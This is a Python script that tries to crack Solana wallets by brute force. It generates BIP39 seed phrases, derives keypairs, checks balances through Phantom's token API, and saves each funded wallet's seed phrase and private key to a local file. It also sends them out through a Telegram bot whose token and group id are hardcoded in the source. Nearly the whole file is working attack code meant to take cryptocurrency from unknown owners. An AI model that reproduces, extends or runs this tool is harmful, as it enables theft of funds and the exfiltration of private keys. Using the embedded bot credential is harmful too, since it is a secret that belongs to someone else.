import requests,random,mnemonic,curses,time,codecs,multiprocessing
from solders.keypair import Keypair
from hdwallet import HDWallet
from hdwallet.symbols import BTC as SYMBOL
from hdwallet.symbols import ETH as SYMBOL2
from bit import Key
from bit.format import bytes_to_wif
import concurrent.futures
from eth_account import Account

token = '6901242066:AAH-C8-b0UFP6ymmw8qM1EYy_VU7fOQN8o0'
groupId = 'bjykqla1'
bt1 = 0
bt2 = 0
win1 = 0
wordlist_lines = [ "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo" ]
three = []
fours = []
fives = []
sixes = []
sevens = []

def generate_sentence(num_words=12):
    selected_words = random.sample(wordlist_lines, num_words)
    sentence = ' '.join(selected_words)
    return sentence
    
def load_wordlist_to_list():
    global three, fours, fives, sixes, sevens
    try:
        for word in wordlist_lines:
            word = word.strip()
            if len(word) == 3:
                three.append(word)
            elif len(word) == 4:
                fours.append(word)
            elif len(word) == 5:
                fives.append(word)
            elif len(word) == 6:
                sixes.append(word)
            elif len(word) == 7:
                sevens.append(word)
    except Exception as e:
        print(f"An error occurred: {e}")
        
def getHeader(stdscr, toton, toton2, tofounds):
    stdscr.clear()
    
    curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_WHITE, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(4, curses.COLOR_GREEN, curses.COLOR_BLACK)
    
    stdscr.addstr(0, 0, "[", curses.color_pair(4))
    stdscr.addstr(0, 1, "►", curses.color_pair(1))  
    stdscr.addstr(0, 2, "] Listen To My Website:", curses.color_pair(4))
    stdscr.addstr(0, 26, f"{toton} - {toton2}", curses.color_pair(3))
    
    stdscr.addstr(1, 0, "[", curses.color_pair(4))
    stdscr.addstr(1, 1, "►", curses.color_pair(1))  
    stdscr.addstr(1, 2, "] Login :", curses.color_pair(4))
    stdscr.addstr(1, 13, f"{tofounds}", curses.color_pair(3))

    stdscr.refresh()
    
def entropy_to_mnemonic(entropy_bytes):
    return mnemonic.Mnemonic("english").to_mnemonic(entropy_bytes)
def gene_entropy():
    try:
        #bsee = random.choice([32, 64])
        entropy_str = ''.join(random.choice('0123456789abcdef') for _ in range(32))
        entropy_bytes = bytes.fromhex(entropy_str)
        mnemonic_phrase = entropy_to_mnemonic(entropy_bytes)
        return mnemonic_phrase
    except Exception as e:
        print(f"Error occurred: {e}. Retrying...")
    return None  
    
    
def checkmulti(dataset, dataset2):
    global win1
    addresses_json = []
    for column in dataset.columns:
        if column is not None:
            address = column.read(1)
            coins = column.read(2)
            if address:
                addresses_json.append({"chainId": coins, "address": address})
    
    url = 'https://api.phantom.app/tokens/v1?enableToken2022=true&isPartialResponseEnabled=true'
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'content-type': 'application/json',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    }

    data = {
        "addresses": addresses_json
    }
    #print("Request Data:", data)
    
    cb = 0
    try:
        response = requests.post(url, headers=headers, json=data)
        data = response.json()
        #print("Response Data:", data)

        if 'tokens' in data:
            for token in data['tokens']:
                cb += 1
                final_balance = float(token['data']['amount'])
                address = token['data']['walletAddress']
                name = token['data']['name'] + " - " + token['data']['symbol']
                if final_balance > 0:
                    #print('Address:', address, 'Balance:', final_balance)
                    win1 += 1
                    for i in range(len(dataset.columns)):
                        if dataset.columns[i].read(1) == address:
                            OpAdd = StringColumn()
                            OpAdd.add([dataset.columns[i].read(0),name, address,str(final_balance),dataset.columns[i].read(3),'\n'])
                            dataset2.add_column(OpAdd)
                            break
        else:
            return checkmulti(dataset, dataset2)
        return cb    
    except Exception as e:
        print("Error:", e)
        return checkmulti(dataset, dataset2)
        
        
class StringColumn:
    def __init__(self):
        self.data = []
    def add(self, values):
        self.data.extend(values)
    def clear(self):
        self.data = []
    def read(self, index):
        if 0 <= index < len(self.data):
            return self.data[index]
        else:
            return None
    def size(self):
        return len(self.data)
    def print_column(self):
        for value in self.data:
            print(value)
    def edit_value_when_found(self, target_value, replacement_value):
        for i in range(len(self.data)):
            if self.data[i] == target_value:
                self.data[i+1] = replacement_value
    def edit_value_when_found2(self, target_value, replacement_value):
        for i in range(len(self.data)):
            if self.data[i] == target_value:
                self.data[3] = replacement_value
class Dataset:
    def __init__(self):
        self.columns = []

    def add_column(self, column):
        self.columns.append(column)
            
    def print_dataset(self):
        all_values = []  
        for column in self.columns:
            for value in column.data:
                all_values.append(value)  

        message = '\n'.join(all_values)
        if len(message) >= 5:
            f1 = open("PhFunds.txt" , "a", encoding='utf-8', errors='replace')
            f1.write(f'{message}\n\n')
            f1.close()
            sendMsg(message)  
            
    def edit_value_when_found(self, target_value, replacement_value):
        for column in self.columns:
            column.edit_value_when_found(target_value, replacement_value)
            
    def edit_value_when_found2(self, target_value, replacement_value):
        for column in self.columns:
            column.edit_value_when_found2(target_value, replacement_value)
            
    def read_value_by_index(self, column_index, row_index):
        if 0 <= column_index < len(self.columns):
            column = self.columns[column_index]
            return column.read(row_index)
        else:
            return None
            
    def get_values_from_index(self, index):
        values = []
        for column in self.columns:
            value = column.read(index)
            if value is not None:
                values.append(value)
        return "%2C".join(values)
        
    def get_values_from_index2(self, index):
        values = []
        for column in self.columns:
            value = column.read(index)
            if value is not None:
                values.append(value)
        return ",".join(values)
        
    def get_values_from_index3(self, index):
        values = []
        for column in self.columns:
            value = column.read(index)
            if value is not None:
                values.append(value)
        return "|".join(values)
        
def sendMsg(message):
    try:
        url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id=@{groupId}&text={message}'
        res = requests.get(url.encode('utf-8'))
    except Exception as e:
        return sendMsg(message)

    
def gene_mnemX(num_words=12):
    try:
        seed = []
        word_lists = [three, fours, fives, sixes, sevens]
        while len(seed) < num_words:
            word_length_choice = random.choice(word_lists)
            if word_length_choice:  
                word_choice = random.choice(word_length_choice)
                seed.append(word_choice)
        mnemonic_phrase = ' '.join(seed)
        return mnemonic_phrase
    except Exception as e:
        return gene_mnemX()  
        
def genRBR():
    try:
        while True:
            current_mnemonic = gene_mnemX()
            #print('s:' + gene_mnemX())
            mnemonic_words = current_mnemonic.split()
            shuffle_attempts = 0
            while shuffle_attempts < 50:
                random.shuffle(mnemonic_words)
                shuffled_mnemonic = ' '.join(mnemonic_words)
                try:
                    hdwallet = HDWallet(symbol=SYMBOL2)
                    hdwallet.from_mnemonic(mnemonic=shuffled_mnemonic, passphrase="")
                    return shuffled_mnemonic
                    break
                except ValueError as e:
                    #print(f"Invalid mnemonic: {shuffled_mnemonic}")
                    shuffle_attempts += 1
                    
        return None
    except Exception as e:
        #print(f"Error occurred: {e}. Retrying...")
        return None  
        
def gen64entropX(bst1, num):
    try:
        bx1 = bytes.fromhex(''.join(random.choice('0123456789abcdef') for _ in range(32)))
        current_hex = bx1.hex()
        current_hex2 = current_hex
        bst1.add(entropy_to_mnemonic(bx1))
        for s in range(num):
            current_hex_int = int(current_hex, 16) + 1
            current_hex = format(current_hex_int, '0x')
            bst1.add(entropy_to_mnemonic(bytes.fromhex(current_hex)))
            if s < num-1:  
                current_hex_int2 = int(current_hex2, 16) - 1
                current_hex2 = format(current_hex_int2, '0x')
                bst1.add(entropy_to_mnemonic(bytes.fromhex(current_hex2)))
        return bx1
    except Exception as e:
        print(f"Error occurred: {e}. Retrying...")
        return None
        
def MainCheck(stdscr,seven):
    global bt1,bt2,win1,maxaddress
    curses.curs_set(0)  # Set cursor to invisible
    curses.start_color()
    curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_WHITE, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(4, curses.COLOR_GREEN, curses.COLOR_BLACK)
    getHeader(stdscr,toton=bt1,toton2=bt2,tofounds=win1)
    load_wordlist_to_list()
    Account.enable_unaudited_hdwallet_features()
    while True:
        if seven == 1:
            smMulti = Dataset()
            SmTotal = Dataset()
            bst1 = set()
            last_hex = gen64entropX(bst1, 5)
            #print(len(bst1))
            for item in sorted(bst1):
                mnemonic_phrase = item
                seed = mnemonic.Mnemonic("english").to_seed(mnemonic_phrase)
                path = f"m/44'/501'/0'/0'"
                keypair = Keypair.from_seed_and_derivation_path(seed, path)
                public_key = str(keypair.pubkey())
                OpAdd = StringColumn()
                OpAdd.add([mnemonic_phrase, public_key,"solana:101", str(keypair)])
                smMulti.add_column(OpAdd) 


            bt3 = 0
            bt3 = checkmulti(smMulti,SmTotal)     
            while bt3 == 0:
                time.sleep(0.05)
                #bt3 = checkmulti(smMulti,SmTotal)  
            bt2 += bt3
            bt1 += 1 
            SmTotal.print_dataset()
            time.sleep(0.05)
            getHeader(stdscr,toton=bt1,toton2=bt2,tofounds=win1)
            stdscr.refresh()  
            
def wrapper(main_func, *args, **kwargs):
    def wrapped(stdscr):
        main_func(stdscr, *args, **kwargs)
    return wrapped
    
def wrapper_main(seven):
    curses.wrapper(wrapper(MainCheck, seven=seven))
    #curses.wrapper(MainCheck, seven=seven)
    
def concurrent_task():
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(wrapper_main, 1) for _ in range(10)]

    for future in concurrent.futures.as_completed(futures):
        try:
            result = future.result()
        except Exception as e:
            print(f"Generated an exception: {e}")

if __name__ == '__main__':
    #concurrent_task()
    processes = []
    for ra in range(1):
        process = multiprocessing.Process(target=concurrent_task)
        process.start()
        processes.append(process)
    for process in processes:
        process.join()